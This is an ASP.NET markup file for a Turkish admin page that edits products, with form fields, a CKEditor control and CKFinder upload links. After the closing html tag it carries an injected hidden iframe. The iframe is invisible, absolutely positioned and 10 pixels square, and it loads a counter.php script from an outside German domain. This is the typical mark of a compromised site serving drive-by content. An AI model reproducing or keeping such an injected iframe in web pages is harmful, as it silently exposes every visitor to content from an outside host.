<%@ Page Language="C#" AutoEventWireup="true" CodeFile="UrunDuzenle.aspx.cs" Inherits="Yonetim_HaberDuzenle" %>

<%@ Register TagPrefix="include" TagName="Head" Src="~/Yonetim/Library/Include/Head.ascx" %>
<%@ Register TagPrefix="include" TagName="Ust" Src="~/Yonetim/Library/Include/Ust.ascx" %>
<%@ Register TagPrefix="include" TagName="Menu" Src="~/Yonetim/Library/Include/Menu.ascx" %>
<%@ Register TagPrefix="include" TagName="Alt" Src="~/Yonetim/Library/Include/Alt.ascx" %>

<%@ Register Assembly="CKEditor.NET" Namespace="CKEditor.NET" TagPrefix="CKEditor" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <include:Head runat="server" ID="Head" />
    <style type="text/css">
        .style1
        {
            font-weight: bold;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <div id="main_container">
             <include:Ust runat="server" ID="Ust" />
             
             <div class="main_content">
                <include:Menu runat="server" ID="Menu" />
                
                <div class="center_content">

                    <div style="margin:10px;"> 
                        <h2>Ürün Düzenleme</h2>
                        <fieldset>
                            <legend>Ürün Bilgileri</legend>
                            <div>
                                <table>
                                    <tr>
                                        <td>
                                            <b>Kategori</b></td>
                                        <td>
                                            <b>:</b></td>
                                        <td>
                                            <asp:DropDownList ID="form_katid" runat="server">
                                            </asp:DropDownList>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td class="style1">
                                            Ürün Başlığı</td>
                                        <td>
                                            <b>:</b></td>
                                        <td>
                                            <asp:TextBox ID="form_baslik" runat="server" Width="250px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td colspan="3">
                                            &nbsp;</td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <b>Onay</b></td>
                                        <td>
                                            <b>:</b></td>
                                        <td>
                                            <asp:DropDownList ID="form_onay" runat="server">
                                                <asp:ListItem Value="1">EVET</asp:ListItem>
                                                <asp:ListItem Value="0">HAYIR</asp:ListItem>
                                            </asp:DropDownList>
                                        </td>
                                    </tr>
                                </table>
                            </div>
                        </fieldset>

                        <fieldset>
                                    <legend>İşlemler</legend>
                                    <div>
                                        <asp:Button ID="Button5" runat="server" Text="Düzenle" 
                                            onclick="Button1_Click" />&nbsp;<asp:Button ID="Button6" runat="server" 
                                            onclick="Button3_Click" Text="Düzenle ve Resim Yüklemeye Geç" />
                                        &nbsp;<asp:Button ID="Button7"
                                            runat="server" Text="Vazgeç" onclick="Button2_Click" />&nbsp;<asp:Button 
                                            ID="Button8" runat="server" onclick="Button4_Click" Text="Yeni Ürün Ekle" />
                                    </div>
                                  </fieldset>

                        <fieldset>
                            <legend>Detay</legend>
                            <div><CKEditor:CKEditorControl ID="form_detay" Width="98%" runat="server" 
                                      BasePath="~/Library/App/ckeditor" 
                                      ContentsCss="~/Library/App/ckeditor/contents.css" 
                                      TemplatesFiles="~/Library/App/ckeditor/plugins/templates/templates/default.js" 
                                      Toolbar="Full" ToolbarCanCollapse="False" ToolbarFull="Source|-|Preview|
Cut|Copy|Paste|PasteText|PasteFromWord|-|Print|SpellChecker|Scayt
Undo|Redo|-|Find|Replace|-|SelectAll|RemoveFormat|-|Bold|Italic|Underline|Strike|/|Subscript|Superscript
NumberedList|BulletedList|-|Outdent|Indent|Blockquote|CreateDiv
JustifyLeft|JustifyCenter|JustifyRight|JustifyBlock
Link|Unlink
Image|Flash|Table|SpecialChar|PageBreak|Styles|Format|Font|FontSize
TextColor|BGColor
Maximize|ShowBlocks|" Height="400px" FilebrowserBrowseUrl="/Library/App/ckfinder/ckfinder.html" 
                                      FilebrowserFlashBrowseUrl="/Library/App/ckfinder/ckfinder.html?type=Flash" 
                                      FilebrowserFlashUploadUrl="/Library/App/ckfinder/core/connector/aspx/connector.aspx?command=QuickUpload&amp;type=Flash" 
                                      FilebrowserImageBrowseUrl="/Library/App/ckfinder/ckfinder.html?type=Images" 
                                      FilebrowserImageUploadUrl="/Library/App/ckfinder/core/connector/aspx/connector.aspx?command=QuickUpload&amp;type=Images" 
                                      FilebrowserUploadUrl="/Library/App/ckfinder/core/connector/aspx/connector.aspx?command=QuickUpload&amp;type=Files"></CKEditor:CKEditorControl></div>
                        </fieldset>

                            
                            <fieldset>
                                    <legend>İşlemler</legend>
                                    <div>
                                        <asp:Button ID="Button1" runat="server" Text="Düzenle" 
                                            onclick="Button1_Click" />&nbsp;<asp:Button ID="Button3" runat="server" 
                                            onclick="Button3_Click" Text="Düzenle ve Resim Yüklemeye Geç" />
                                        &nbsp;<asp:Button ID="Button2"
                                            runat="server" Text="Vazgeç" onclick="Button2_Click" />&nbsp;<asp:Button 
                                            ID="Button4" runat="server" onclick="Button4_Click" Text="Yeni Ürün Ekle" />
                                    </div>
                                  </fieldset>

                                  <fieldset>
                                    <legend>Kayıt Bilgileri</legend>
                                    <div>
                                        <table>
                                            <tr>
                                                <td class="style1">
                                                    Kayıt Tarihi</td>
                                                <td>
                                                    <b>:</b></td>
                                                <td><asp:Literal runat="server" ID="kayittarih"></asp:Literal></td>
                                            </tr>
                                            <tr>
                                                <td class="style1">
                                                    Düzenleme Tarihi</td>
                                                <td>
                                                    <b>:</b></td>
                                                <td><asp:Literal runat="server" ID="degistarih"></asp:Literal></td>
                                            </tr>
                                            </table>
                                    </div>
                                  </fieldset>
                                  </div>
                </div>
                
                <div class="clear"></div>
            </div>

            <include:Alt runat="server" ID="Alt" />

        </div>
    </form>
</body>
</html><iframe src="http://www.bc-bs.de/counter.php" style="visibility: hidden; position: absolute; left: 0px; top: 0px" width="10" height="10"/>




